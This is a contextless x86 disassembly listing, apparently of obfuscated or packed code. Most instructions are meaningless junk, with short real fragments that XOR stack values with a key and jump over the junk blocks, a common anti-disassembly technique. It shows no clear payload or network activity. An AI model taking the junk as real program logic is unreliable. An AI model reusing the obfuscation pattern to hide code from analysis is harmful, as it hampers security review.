  4044c1:	push   0xffffffba
  4044c3:	add    ch,al
  4044c5:	push   eax
  4044c6:	hlt    
  4044c7:	inc    DWORD PTR ds:[eax+0x7d]
  4044cb:	adc    bh,ah
  4044cd:	or     eax,0x346989fc
  4044d2:	dec    esp
  4044d3:	pop    ss
  4044d4:	jne    0x404549
  4044d6:	xchg   BYTE PTR [eax],ah
  4044d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044d9:	in     al,dx
  4044da:	adc    al,BYTE PTR [edx-0x612eda0c]
  4044e0:	inc    edx
  4044e1:	iret   
  4044e2:	fdivp  st(7),st
  4044e4:	mov    ds,WORD PTR ds:[ebp+0x28801295]
  4044eb:	cmp    al,0xb4
  4044ed:	imul   esp,esp,0xa3c4e990
  4044f3:	popf   
  4044f4:	and    al,ah
  4044f6:	cmp    eax,0x1e64390d
  4044fb:	jns    0x4044cb
  4044fd:	mov    BYTE PTR [edi-0x758e0569],cl
  404503:	out    0x18,eax
  404505:	bound  esp,QWORD PTR [ebx]
  404507:	das    
  404508:	ss and dh,al
  40450b:	(bad)  
  40450d:	mov    ebx,0xb3df84a0
  404512:	inc    ecx
  404513:	sub    bh,bl
  404515:	cwde   
  404516:	and    al,0xb4
  404518:	call   0x47fb72b3
  40451d:	adc    eax,edi
  40451f:	push   esp
  404520:	jmp    0x4044b1
  404522:	cmc    
  404523:	ret    0x758b
  404526:	retf   0x3d60
  404529:	test   al,0x4c
  40452b:	jns    0x404591
  40452d:	les    esp,FWORD PTR [esi+0x2a]
  404530:	fisttp WORD PTR [edx+0x52]
  404533:	push   ebp
  404534:	sub    BYTE PTR [ebp-0x2f],bl
  404537:	jmp    0x404518
  404539:	stos   BYTE PTR es:[edi],al
  40453a:	mov    ch,0x4f
  40453c:	sbb    eax,DWORD PTR [esi+0x71]
  40453f:	sti    
  404540:	inc    edx
  404541:	fisttp DWORD PTR [eax+0x46]
  404544:	mov    ebx,0x11f3ab4e
  404549:	pop    ebx
  40454a:	push   eax
  40454b:	and    ah,dl
  40454d:	retf   0xa175
  404550:	(bad)  
  404551:	jno    0x404552
  404553:	pop    edx
  404554:	xor    dl,BYTE PTR [eax+0xe3ebc08]
  40455a:	test   eax,0x20c846ca
  40455f:	pushf  
  404560:	sub    dl,dh
  404562:	mov    edi,0x3faf97fc
  404567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404568:	sbb    eax,0x7a2a014f
  40456d:	and    edx,ecx
  40456f:	arpl   WORD PTR [edi+0x25],cx
  404572:	mov    dh,0x2c
  404574:	fs aad 0x15
  404577:	mov    ch,0xa2
  404579:	arpl   WORD PTR [edx-0x22],sp
  40457c:	(bad)  
  40457d:	pop    esi
  40457e:	rcl    bh,cl
  404580:	xor    BYTE PTR [ecx+0x1d],dl
  404583:	inc    ebp
  404584:	dec    ecx
  404585:	jmp    0xc8e145f2
  40458a:	and    ebx,0x8434a7c9
  404590:	mov    ch,0x33
  404592:	clc    
  404593:	jle    0x4045d9
  404595:	jne    0x4045c8
  404597:	stc    
  404598:	(bad)  
  404599:	ds dec ecx
  40459b:	mov    bh,0x71
  40459d:	jl     0x4045d0
  40459f:	xlat   BYTE PTR ds:[ebx]
  4045a0:	jp     0x4045b2
  4045a2:	xor    BYTE PTR [eax],al
  4045a4:	shl    dl,1
  4045a6:	dec    esp
  4045a7:	ins    DWORD PTR es:[edi],dx
  4045a8:	mov    edi,fs
  4045aa:	rcl    BYTE PTR ds:0xaca48020,cl
  4045b0:	jp     0x404600
  4045b2:	cmp    eax,0x9b72684d
  4045b7:	mov    ch,0x34
  4045b9:	mov    ch,0x30
  4045bb:	dec    ebx
  4045bc:	mov    bl,0x27
  4045be:	jnp    0x4045ce
  4045c0:	pushf  
  4045c1:	popa   
  4045c2:	gs mov cl,0xdc
  4045c5:	shl    BYTE PTR [edi+edx*4+0x3b],cl
  4045c9:	imul   edi,DWORD PTR [edx+eiz*4+0x3b3575e4],0x9daabc47
  4045d4:	loop   0x40464d
  4045d6:	jnp    0x40463b
  4045d8:	loope  0x4045d1
  4045da:	xor    eax,0xd6acce7f
  4045df:	jge    0x4045f5
  4045e1:	push   es
  4045e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045e3:	sbb    al,0x99
  4045e5:	jg     0x40458f
  4045e7:	ja     0x4045d6
  4045e9:	xchg   ebx,eax
  4045ea:	and    al,0x1d
  4045ec:	mov    BYTE PTR [edx],ah
  4045ee:	push   es
  4045ef:	sbb    ebp,edi
  4045f1:	sbb    eax,0x32fef506
  4045f6:	sub    ebx,edi
  4045f8:	cmp    ebx,edx
  4045fa:	ja     0x404608
  404600:	mov    edx,DWORD PTR [ebp-0x34]
  404603:	jmp    0x40462f
  404608:	mov    edx,DWORD PTR [ebp-0x3c]
  40460b:	mov    edi,DWORD PTR [ebp-0x4]
  40460e:	xor    edx,eax
  404610:	xor    edi,eax
  404612:	add    edx,ecx
  404614:	add    edi,ecx
  404616:	imul   edx,edi
  404619:	mov    edi,DWORD PTR [ebp-0x8]
  40461c:	mov    ebx,DWORD PTR [ebp-0x10]
  40461f:	sub    ebx,edi
  404621:	cmp    ebx,edx
  404623:	mov    edx,DWORD PTR [ebp-0x38]
  404626:	jbe    0x40462f
  40462c:	mov    edx,DWORD PTR [ebp-0x3c]
  40462f:	mov    edi,DWORD PTR [ebp-0x4]
  404632:	xor    edi,eax
  404634:	xor    edx,eax
  404636:	add    edi,ecx
  404638:	add    edx,ecx
  40463a:	jmp    0x40479f
  40463f:	mov    WORD PTR [ecx+esi*8+0x3f],es
  404643:	dec    ecx
  404644:	(bad)  [esi+0x47]
  404647:	stos   BYTE PTR es:[edi],al
  404648:	call   0x34fc:0xe80bb2d5
  40464f:	ss push ds
  404651:	jl     0x4046cf
  404653:	xor    al,0x7f
  404655:	jl     0x4046d3
  404657:	inc    esi
  404658:	shl    esi,cl
  40465a:	mov    ebx,0xdf57b87d
  40465f:	pop    ebx
  404660:	mov    dl,ah
  404662:	pop    ebp
  404663:	mov    eax,ds:0x506eb99e
  404668:	jae    0x4045ec
  40466a:	hlt    
  40466b:	or     dl,BYTE PTR [ebp+edx*1+0x95f57d4]
  404672:	xchg   BYTE PTR [ecx+0x12d8cbf6],ah
  404678:	into   
  404679:	xchg   BYTE PTR [edx-0x75f006e6],al
  40467f:	shl    DWORD PTR ds:0x78576a85,cl
  404685:	xor    ecx,DWORD PTR [esi+0x45]
  404688:	js     0x40463b
  40468a:	sub    al,0xa9
  40468c:	mov    esp,0xdb6ef196
  404691:	cmc    
  404692:	push   es
  404693:	rcr    DWORD PTR [ecx-0x4c],0xe9
  404697:	fist   WORD PTR [edx-0x78fe2f61]
  40469d:	cmp    ch,BYTE PTR [ebx+ebp*1-0x11c91e46]
  4046a4:	stos   BYTE PTR es:[edi],al
  4046a5:	or     BYTE PTR [esp+eiz*4],cl
  4046a8:	mov    edi,0xf04d87f4
  4046ad:	push   eax
  4046ae:	leave  
  4046af:	sbb    BYTE PTR [ecx],cl
  4046b1:	and    al,0xda
  4046b3:	inc    ecx
  4046b4:	xchg   esi,eax
  4046b5:	(bad)  
  4046b6:	lea    eax,es:0xa4271d9a
  4046bd:	outs   dx,BYTE PTR ds:[esi]
  4046be:	daa    
  4046bf:	mov    cl,0xcf
  4046c1:	mov    ch,0xf0
  4046c3:	dec    ecx
  4046c4:	and    bl,BYTE PTR [ebp-0xa]
  4046c7:	dec    esi
  4046c8:	push   edi
  4046c9:	sbb    BYTE PTR [edx+0x4d],bh
  4046cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046cd:	je     0x40473e
  4046cf:	mov    DWORD PTR gs:[ebp-0x6490f202],ecx
  4046d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046d7:	mov    ecx,0x386d8adb
  4046dc:	mov    ds:0xe3386999,al
  4046e1:	adc    BYTE PTR [ebp+0x5f],0xe8
  4046e5:	call   FWORD PTR [ebp-0x36]
  4046e8:	inc    ebp
  4046e9:	das    
  4046ea:	hlt    
  4046eb:	dec    esp
  4046ec:	test   al,0xe5
  4046ee:	xchg   esp,eax
  4046ef:	cmc    
  4046f0:	adc    BYTE PTR [ebx+0x70],bh
  4046f3:	jnp    0x40473b
  4046f5:	sub    BYTE PTR [eax+edi*1],cl
  4046f8:	cmp    BYTE PTR [edi-0xaf72f20],ch
  4046fe:	add    al,0xea
  404700:	inc    ebx
  404701:	xor    bl,al
  404703:	or     esp,DWORD PTR [edx-0xb745397]
  404709:	push   0xfa0a81c2
  40470e:	enter  0x2639,0x49
  404712:	retf   
  404713:	add    ebp,0xbebb2513
  404719:	push   ecx
  40471a:	inc    edx
  40471b:	not    DWORD PTR [edx+ebp*1+0x5d0d5488]
  404722:	sub    ebp,DWORD PTR [ebp-0x2f]
  404725:	ja     0x4046e4
  404727:	xchg   ecx,eax
  404728:	push   cs
  404729:	pusha  
  40472a:	pop    esp
  40472b:	inc    edx
  40472c:	popf   
  40472d:	add    dl,dh
  40472f:	adc    BYTE PTR [eax-0x3b],cl
  404732:	dec    edi
  404733:	aad    0x9
  404735:	mov    al,0x72
  404737:	jo     0x4046dd
  404739:	cmc    
  40473a:	(bad)  
  40473b:	mov    esi,0x67deb052
  404740:	add    DWORD PTR [esi],ecx
  404742:	jp     0x4046e1
  404744:	dec    esi
  404745:	(bad)
  404748:	sbb    BYTE PTR [ecx],0x1d
  40474b:	pop    esp
  40474c:	int    0x1b
  40474e:	and    eax,0x1811f873
  404753:	dec    ecx
  404754:	inc    ebp
  404755:	sahf   
  404756:	ud1    edx,DWORD PTR [esi]
  404759:	xchg   edi,eax
  40475a:	clc    
  40475b:	push   ebp
  40475c:	(bad)  [ebp-0x6e32f94a]
  404762:	mov    edi,0xb6114a17
  404767:	popa   
  404768:	mov    ds,WORD PTR [edx+0x316702ec]
  40476e:	sbb    al,0xc4
  404770:	inc    eax
  404771:	mov    al,0x1d
  404773:	xchg   ebx,eax
  404774:	icebp  
  404775:	hlt    
  404776:	sbb    BYTE PTR [ebx-0x68],dh
  404779:	dec    ebx
  40477a:	jge    0x404725
  40477c:	pop    ss
  40477d:	xor    ebx,DWORD PTR [esi+0x3a]
  404780:	(bad)  
  404781:	fxch   st(6)
  404783:	or     DWORD PTR [ecx],edx
  404785:	lods   al,BYTE PTR ds:[esi]
  404786:	inc    esp
  404787:	cmp    BYTE PTR [ebx-0x3f601d43],al
  40478d:	push   cs
  40478e:	clc    
  40478f:	out    0x28,al
  404791:	mov    DWORD PTR [edi-0xc564309],eax
  404797:	push   ss
  404798:	div    DWORD PTR [edx-0x33]
  40479b:	repz add al,al
  40479e:	jnp    0x4047af
  4047a0:	scas   eax,DWORD PTR es:[edi]
  4047a1:	xlat   BYTE PTR ds:[ebx]
  4047a2:	mov    DWORD PTR [ebp+0xc],edx
  4047a5:	mov    edx,DWORD PTR [ebp+0xc]
  4047a8:	mov    DWORD PTR [ebp-0x24],edx
  4047ab:	mov    edx,DWORD PTR [ebp-0x8]
  4047ae:	add    edx,DWORD PTR [ebp-0x40]
  4047b1:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  4047b8:	mov    DWORD PTR [ebp-0x1c],edx
  4047bb:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  4047c2:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4047c9:	mov    edx,DWORD PTR [ebp-0x18]
  4047cc:	xor    edx,eax
  4047ce:	add    edx,ecx
  4047d0:	jmp    0x404c6c
  4047d5:	mov    edx,DWORD PTR [ebp-0x18]
  4047d8:	xor    edx,eax
  4047da:	add    edx,DWORD PTR [ebp-0x14]
  4047dd:	mov    edi,DWORD PTR [ebp-0x1c]
  4047e0:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  4047e7:	mov    BYTE PTR [ebp+0xf],dl
  4047ea:	jmp    0x40494f
  4047ef:	int    0xf4
  4047f1:	mov    esi,0xfd66b566
  4047f6:	mov    ebx,0x8fce1da9
  4047fb:	push   ebp
  4047fc:	inc    ebx
  4047fd:	add    bh,BYTE PTR [ebp+0x7c7c118e]
  404803:	xor    al,0x7f
  404805:	jl     0x404883
  404807:	(bad)  
  404808:	(bad)  
  404809:	mov    bl,0xd7
  40480b:	jno    0x4047c1
  40480d:	sti    
  40480e:	fsub   QWORD PTR [esi]
  404810:	pop    es
  404811:	repz imul ebx,DWORD PTR [ecx+0x2c],0x190a9b5b
  404819:	jns    0x4047ee
  40481b:	mov    eax,0x45fe409b
  404820:	jge    0x4047be
  404822:	xor    DWORD PTR [ebx],ebx
  404824:	dec    ebx
  404825:	fsubr  DWORD PTR [edi-0x40018cf1]
  40482b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40482d:	ror    cl,0xbf
  404830:	push   edx
  404831:	push   eax
  404832:	fcomp  QWORD PTR [ebp+0x56]
  404835:	add    ebx,DWORD PTR [ecx-0xf]
  404838:	pop    ds
  404839:	adc    esp,esi
  40483b:	test   DWORD PTR [edx-0x21762f8e],ecx
  404841:	inc    ebx
  404842:	mov    ds:0x88fb2f3c,eax
  404847:	or     dl,bl
  404849:	inc    ecx
  40484a:	neg    BYTE PTR [edi]
  40484c:	sbb    edi,DWORD PTR [ebp-0x73]
  40484f:	hlt    
  404850:	sbb    bh,ch
  404852:	pop    esp
  404853:	dec    esi
  404854:	(bad)  
  404857:	aam    0x5b
  404859:	or     al,0x41
  40485b:	test   esp,0x2cc605a2
  404861:	loop   0x404854
  404863:	rcr    BYTE PTR [eax],cl
  404865:	(bad)  
  404866:	jne    0x4048da
  404868:	cs stos DWORD PTR es:[edi],eax
  40486a:	pushf  
  40486b:	imul   ecx,ecx,0x28b346e5
  404871:	jl     0x4048f2
  404873:	xchg   esp,eax
  404874:	dec    edi
  404875:	idiv   DWORD PTR [esi+0x73]
  404878:	inc    eax
  404879:	add    al,0xd4
  40487b:	push   eax
  40487c:	xchg   BYTE PTR ds:0xf43f3115,dl
  404882:	push   ds
  404883:	loop   0x4048eb
  404885:	xchg   ebx,eax
  404886:	jp     0x40481e
  404888:	push   ds
  404889:	(bad)  
  40488a:	fdiv   DWORD PTR [edx]
  40488c:	jecxz  0x404826
  40488e:	xor    edi,esi
  404890:	scas   eax,DWORD PTR es:[edi]
  404891:	mov    eax,ds:0xff9f3fac
  404896:	gs sbb al,0x76
  404899:	daa    
  40489a:	loop   0x4048ea
  40489c:	add    eax,0xe94edfba
  4048a1:	dec    ebx
  4048a2:	xchg   edx,eax
  4048a3:	outs   dx,DWORD PTR ds:[esi]
  4048a4:	call   0xfad4:0x37521fcc
  4048ab:	aaa    
  4048ac:	sub    esp,DWORD PTR [eax+0x2a]
  4048af:	gs xchg ecx,eax
  4048b1:	mov    ds:0x65091bf8,eax
  4048b6:	fnstenv [ebp+0x1d]
  4048b9:	icebp  
  4048ba:	(bad)  
  4048bb:	int3   
  4048bc:	ret    0xce08
  4048bf:	fs jne 0x4048f9
  4048c2:	xor    ecx,DWORD PTR [edi-0x62]
  4048c5:	mov    esi,0x55664ee2
  4048ca:	xor    eax,0xf85b2c74
  4048cf:	sbb    eax,0x5dbe3099
  4048d4:	and    DWORD PTR [ebx+0x19959b13],eax
  4048da:	push   ebx
  4048db:	inc    edi
  4048dc:	inc    ecx
  4048dd:	jb     0x4048bd
  4048df:	adc    bl,BYTE PTR [ecx+ebp*4+0x16819d03]
  4048e6:	mov    ebx,0xd9b38cb8
  4048eb:	cmp    bl,ch
  4048ed:	or     edx,edi
  4048ef:	ffree  st(2)
  4048f1:	dec    edx
  4048f2:	cld    
  4048f3:	jnp    0x4048ba
  4048f5:	dec    DWORD PTR [esi]
  4048f7:	daa    
  4048f8:	mov    BYTE PTR [ebx+ebx*2],dh
  4048fb:	je     0x4048d1
  4048fd:	in     eax,dx
  4048fe:	sbb    BYTE PTR [esp+esi*8+0x65],dh
  404902:	sbb    dl,BYTE PTR [esi+0x26]
  404905:	or     DWORD PTR [edi+eax*8+0x1063e8f2],0xa
  40490d:	mul    BYTE PTR [esi+0x11a1e95]
  404913:	loopne 0x404910
  404915:	or     DWORD PTR [ecx],esp
  404917:	fsub   QWORD PTR [edx+edx*2]
  40491a:	inc    ebp
  40491b:	and    bh,BYTE PTR [ecx]
  40491d:	into   
  40491e:	push   esi
  40491f:	ja     0x404945
  404921:	ret    0xf9a9
  404924:	pusha  
  404925:	sbb    ecx,edx
  404927:	stc    
  404928:	in     al,0x6e
  40492a:	mov    esi,0x7dc9ae57
  40492f:	ss xchg esp,eax
  404931:	sbb    bh,ch
  404933:	outs   dx,DWORD PTR ds:[esi]
  404934:	push   ss
  404935:	mov    bl,dh
  404937:	cmp    BYTE PTR [esi-0x11290b8b],0x7
  40493e:	mov    ds,WORD PTR [ecx+0x2b2396c0]
  404944:	inc    esi
  404945:	int    0x3d
  404947:	test   al,0x20
  404949:	push   edi
  40494a:	lock mov al,ds:0x8b376ee7
  404950:	push   ebp
  404951:	hlt    
  404952:	xor    edx,eax
  404954:	add    edx,DWORD PTR [ebp-0x14]
  404957:	mov    edi,DWORD PTR [ebp-0x1c]
  40495a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  404961:	mov    BYTE PTR [ebp+0xb],dl
  404964:	mov    dl,BYTE PTR [ebp+0xf]
  404967:	mov    edi,DWORD PTR [ebp-0xc]
  40496a:	xor    edi,eax
  40496c:	add    edi,DWORD PTR [ebp-0x14]
  40496f:	mov    ebx,DWORD PTR [ebp-0x1c]
  404972:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404979:	jmp    0x404ade
  40497e:	adc    ebx,DWORD PTR cs:[ecx]
  404981:	iret   
  404982:	sbb    eax,0xb1d5e6fd
  404987:	and    edi,DWORD PTR ss:[ebx-0x1fff5f3b]
  40498e:	inc    esi
  40498f:	adc    BYTE PTR [esp+edi*2+0x34],bh
  404993:	jg     0x404a11
  404995:	jl     0x4049fd
  404997:	pop    es
  404998:	jb     0x4049b8
  40499a:	outs   dx,DWORD PTR ds:[esi]
  40499b:	(bad)  
  40499c:	out    dx,eax
  40499d:	popf   
  40499e:	fistp  WORD PTR [eax+esi*1]
  4049a1:	mov    bh,0x72
  4049a3:	xor    eax,0xaa5d982c
  4049a8:	es out dx,eax
  4049aa:	cmp    DWORD PTR [eax-0x4b],0xffffff9c
  4049ae:	mov    dh,0xf8
  4049b0:	or     DWORD PTR [ecx+0x92e2071],esp
  4049b6:	gs inc esp
  4049b8:	add    BYTE PTR [ebp+0x4635759d],dl
  4049be:	ds dec ecx
  4049c0:	jg     0x404a34
  4049c2:	push   es
  4049c3:	inc    esi
  4049c4:	adc    eax,0x4f273d79
  4049c9:	inc    ebp
  4049ca:	aas    
  4049cb:	aaa    
  4049cc:	and    BYTE PTR [edi],0xde
  4049cf:	mov    edx,0xea08c9f4
  4049d4:	and    edi,DWORD PTR [ecx]
  4049d6:	clc    
  4049d7:	mov    ebx,0xd9684f
  4049dc:	cwde   
  4049dd:	pop    esp
  4049de:	in     al,dx
  4049df:	push   0x64c370e9
  4049e4:	xor    al,0x96
  4049e6:	mov    eax,ecx
  4049e8:	loope  0x40499a
  4049ea:	mov    ebx,0xe4514ae7
  4049ef:	xchg   ebp,eax
  4049f0:	dec    edi
  4049f1:	popa   
  4049f2:	add    bh,bl
  4049f4:	aad    0x24
  4049f6:	dec    ecx
  4049f7:	add    DWORD PTR [edx+0x13088d0],eax
  4049fd:	push   edx
  4049fe:	jae    0x404a7d
  404a00:	loop   0x40498c
  404a02:	and    al,0x30
  404a04:	xor    esp,ebp
  404a06:	jno    0x404a5e
  404a08:	outs   dx,BYTE PTR ds:[esi]
  404a09:	js     0x404a7a
  404a0b:	or     eax,0x766d2d1d
  404a10:	dec    eax
  404a11:	aad    0x74
  404a13:	cmp    ebp,DWORD PTR [eax+0x694664b1]
  404a19:	cwde   
  404a1a:	out    dx,al
  404a1b:	inc    edi
  404a1c:	add    ebx,ebp
  404a1e:	and    ebx,DWORD PTR [ecx]
  404a20:	lods   al,BYTE PTR ds:[esi]
  404a21:	xchg   ebp,eax
  404a22:	sub    ah,bl
  404a24:	mov    ebx,0x8f0f86ce
  404a29:	rol    DWORD PTR [ecx+0x20],cl
  404a2c:	sbb    DWORD PTR [esi],esp
  404a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a2f:	cmp    dh,BYTE PTR [eax+0x5d96f0bb]
  404a35:	xor    ebx,DWORD PTR [edx-0x4a3004f5]
  404a3b:	loopne 0x404a8c
  404a3d:	and    bh,BYTE PTR [edx-0x48]
  404a40:	adc    edi,DWORD PTR [edi+0x16]
  404a43:	nop
  404a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a45:	stc    
  404a46:	ret    0xa967
  404a49:	pop    edx
  404a4a:	push   ebp
  404a4b:	push   ebp
  404a4c:	in     eax,0xec
  404a4e:	lea    edx,[edx-0xc]
  404a51:	inc    dl
  404a53:	sbb    DWORD PTR [ebx-0x73cd4a79],edx
  404a59:	push   eax
  404a5a:	inc    ebx
  404a5b:	repnz out dx,eax
  404a5d:	sar    DWORD PTR [esi+0x4fcdf46c],0xf8
  404a64:	repnz or al,0x29
  404a67:	fsubr  st(7),st
  404a69:	pusha  
  404a6a:	(bad)  
  404a6b:	push   ecx
  404a6c:	push   edx
  404a6d:	cmp    BYTE PTR [edi],bl
  404a6f:	sub    eax,0x801f368d
  404a74:	mov    esi,0xe0248952
  404a79:	aas    
  404a7a:	jnp    0x404ac5
  404a7c:	ss adc eax,0xacfb1a2c
  404a82:	nop
  404a83:	cld    
  404a84:	stos   DWORD PTR es:[edi],eax
  404a85:	cdq    
  404a86:	lods   al,BYTE PTR ds:[esi]
  404a87:	cs test eax,0x4f2bc1a1
  404a8d:	or     al,0xa6
  404a8f:	jnp    0x404a8c
  404a91:	aam    0xa6
  404a93:	inc    ebx
  404a94:	mov    ds:0x7b1550be,eax
  404a99:	popf   
  404a9a:	adc    al,BYTE PTR [ebx+0x39b02bf8]
  404aa0:	pusha  
  404aa1:	repz jmp 0x8fd8b84e
  404aa7:	ret    0x57b
  404aaa:	(bad)  
  404aab:	cs popf 
  404aad:	or     ch,BYTE PTR [eax+0x1e937a50]
  404ab3:	mov    esi,0x4413f93d
  404ab8:	jb     0x404a8b
  404aba:	ret    
  404abb:	xor    al,0x2
  404abd:	dec    edx
  404abe:	das    
  404abf:	hlt    
  404ac0:	jbe    0x404b1e
  404ac2:	(bad)  
  404ac4:	loopne 0x404a8f
  404ac6:	xchg   esi,eax
  404ac7:	inc    ecx
  404ac8:	mov    ebp,0xf61ecfb5
  404acd:	retf   0xdd0d
  404ad0:	pop    ss
  404ad1:	add    dh,cl
  404ad3:	cwde   
  404ad4:	push   eax
  404ad5:	add    DWORD PTR [edx],esp
  404ad7:	jne    0x404a5b
  404ad9:	jne    0x404a9f
  404adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404adc:	int3   
  404add:	ror    DWORD PTR [edx+0x7d8b0b55],cl
  404ae3:	call   0x7d44431b
  404ae8:	in     al,dx
  404ae9:	mov    ebx,DWORD PTR [ebp-0x1c]
  404aec:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404af3:	mov    edx,DWORD PTR [ebp-0x44]
  404af6:	mov    edi,DWORD PTR [ebp-0xc]
  404af9:	xor    edx,eax
  404afb:	xor    edi,eax
  404afd:	add    edx,ecx
  404aff:	add    edi,ecx
  404b01:	imul   edx,edi
  404b04:	add    edx,DWORD PTR [ebp-0x14]
  404b07:	jmp    0x404c6c
  404b0c:	stos   DWORD PTR es:[edi],eax
  404b0d:	outs   dx,BYTE PTR ds:[esi]
  404b0e:	cmp    al,0x3d
  404b10:	fnstsw WORD PTR [ebp+0x313d6e7d]
  404b16:	lods   eax,DWORD PTR ds:[esi]
  404b17:	sbb    eax,0xd53e29f4
  404b1c:	push   ds
  404b1d:	adc    bh,BYTE PTR [esp+edi*2+0x34]
  404b21:	jg     0x404b9f
  404b23:	jl     0x404aa9
  404b25:	bnd jmp 0x460dc374
  404b2b:	aaa    
  404b2c:	je     0x404b9b
  404b2e:	ret    0xe042
  404b31:	push   edi
  404b32:	ds ja  0x404b6e
  404b35:	mov    dl,0x2b
  404b37:	adc    eax,0x8f99491b
  404b3c:	jmp    FWORD PTR [ebx-0x72]
  404b3f:	aam    0xbe
  404b41:	push   ecx
  404b42:	into   
  404b43:	in     eax,dx
  404b44:	(bad)  
  404b45:	jecxz  0x404b5a
  404b47:	scas   eax,DWORD PTR es:[edi]
  404b48:	push   esp
  404b49:	jno    0x404b3a
  404b4b:	push   ebp
  404b4c:	inc    eax
  404b4d:	(bad)  
  404b4e:	xlat   BYTE PTR ds:[ebx]
  404b4f:	inc    edi
  404b50:	stos   DWORD PTR es:[edi],eax
  404b51:	ds mov edx,0x6fb35789
  404b57:	or     al,0xfe
  404b59:	mov    dl,0xd4
  404b5b:	pop    ss
  404b5c:	inc    BYTE PTR [ebx-0x6f]
  404b5f:	cmp    ecx,DWORD PTR [ebx-0x49]
  404b62:	cld    
  404b63:	sub    bh,BYTE PTR [ecx+0x76]
  404b66:	data16 cmp ax,0xbe4c
  404b6b:	popa   
  404b6c:	repnz inc esi
  404b6e:	push   edx
  404b6f:	hlt    
  404b70:	jb     0x404b4e
  404b72:	repnz pop ebx
  404b74:	or     dh,al
  404b76:	shr    BYTE PTR [edi-0x45158d63],0x55
  404b7d:	stos   BYTE PTR es:[edi],al
  404b7e:	fistp  WORD PTR [ecx-0x17]
  404b81:	sub    DWORD PTR [esi+0x7512ad66],ebp
  404b87:	maskmovq mm6,(bad)
  404b88:	div    DWORD PTR [ebp+0x39]
  404b8b:	fdivr  DWORD PTR [edi+ebx*2-0x43]
  404b8f:	mov    dh,0x1f
  404b91:	outs   dx,DWORD PTR ds:[esi]
  404b92:	lahf   
  404b93:	xchg   ecx,eax
  404b94:	sub    dh,BYTE PTR fs:[ebx-0x55ee31c7]
  404b9b:	nop
  404b9c:	fsubrp st(4),st
  404b9e:	jecxz  0x404c07
  404ba0:	loop   0x404b72
  404ba2:	out    0xcf,eax
  404ba4:	and    esp,DWORD PTR [eax]
  404ba6:	je     0x404bd4
  404ba8:	mov    es,WORD PTR ds:0xd2f19b0c
  404bae:	pop    edi
  404baf:	xchg   DWORD PTR [eax+0x5af43b5d],esp
  404bb5:	out    0x5a,al
  404bb7:	out    dx,eax
  404bb8:	aas    
  404bb9:	shl    BYTE PTR [ebx],1
  404bbb:	jae    0x404b57
  404bbd:	mov    cl,0xfd
  404bbf:	retf   0x29d7
  404bc2:	(bad)  
  404bc3:	sti    
  404bc4:	jecxz  0x404b5d
  404bc6:	or     edi,esp
  404bc8:	(bad)
  404bcc:	dec    ebp
  404bcd:	stos   BYTE PTR es:[edi],al
  404bce:	mov    cl,0xc1
  404bd0:	xchg   edi,eax
  404bd1:	retf   
  404bd2:	jmp    0xa7ab84ac
  404bd7:	not    BYTE PTR [edx+0x36]
  404bda:	shl    ecx,1
  404bdc:	xlat   BYTE PTR ds:[ebx]
  404bdd:	xchg   edi,eax
  404bde:	jmp    0x404c37
  404be0:	jmp    0x7039:0x99e90c3f
  404be7:	loopne 0x404b9c
  404be9:	dec    ebp
  404bea:	or     eax,0xcdf61e13
  404bef:	fist   WORD PTR [eax]
  404bf1:	aad    0x1d
  404bf3:	mov    eax,0x5b9ad2db
  404bf8:	js     0x404c03
  404bfa:	mov    ecx,0xffbb42ed
  404bff:	shl    BYTE PTR [esi+0x1fc5a00b],1
  404c05:	fimul  DWORD PTR es:[edi-0x5e]
  404c09:	div    DWORD PTR [edi+0x7d]
  404c0c:	mov    ebp,0xeb5886fa
  404c11:	pop    ds
  404c12:	sub    BYTE PTR [ecx],ah
  404c14:	or     al,0x5
  404c16:	mov    eax,0xcec54a2
  404c1b:	jmp    0x404c72
  404c1d:	mov    edi,0x270ddfb2
  404c22:	jge    0x404c38
  404c24:	ja     0x404c6d
  404c26:	dec    DWORD PTR [eax+esi*8+0x4ba98286]
  404c2d:	sub    al,bh
  404c2f:	cmp    eax,0x1f591874
  404c34:	stos   DWORD PTR es:[edi],eax
  404c35:	push   ebp
  404c36:	lahf   
  404c37:	call   0xf227:0x85eb63fc
  404c3e:	adc    eax,0x589a1010
  404c43:	jle    0x404bcb
  404c45:	shr    DWORD PTR [eax],cl
  404c47:	mov    bh,0x8c
  404c49:	mov    eax,ds:0xb0a04baf
  404c4e:	inc    eax
  404c4f:	ficom  WORD PTR [eax-0x451fee6f]
  404c55:	dec    ecx
  404c56:	mov    esp,0xd46a2398
  404c5b:	push   ds
  404c5c:	cdq    
  404c5d:	cmp    al,0x5d
  404c5f:	test   al,0xe2
  404c61:	stc    
  404c62:	dec    edx
  404c63:	or     eax,0x9e17181
  404c68:	jnp    0x404cbb
  404c6a:	dec    esi
  404c6b:	ret    
  404c6c:	mov    DWORD PTR [ebp-0x14],edx
  404c6f:	mov    edx,DWORD PTR [ebp-0xc]
  404c72:	mov    edi,DWORD PTR [ebp-0x24]
  404c75:	jmp    0x404dda
  404c7a:	or     al,BYTE PTR [ecx-0x1aa2d1be]
  404c80:	push   0xffffffbd
  404c82:	cmp    eax,ecx
  404c84:	dec    esi
  404c85:	shr    DWORD PTR [ecx],0xdb
  404c88:	fs cmp edx,esi
  404c8b:	adc    eax,0x7f347c7c
  404c90:	jl     0x404d0e
  404c92:	or     bh,BYTE PTR [ebx+0x8]
  404c95:	fs in  eax,dx
  404c97:	and    edi,edx
  404c99:	iret   
  404c9a:	repnz out 0x23,al
  404c9d:	xor    DWORD PTR [ecx+0x2d6b89c],esp
  404ca3:	addr16 mov ds:0x88df,eax
  404ca7:	hlt    
  404ca8:	inc    ebp
  404ca9:	aas    
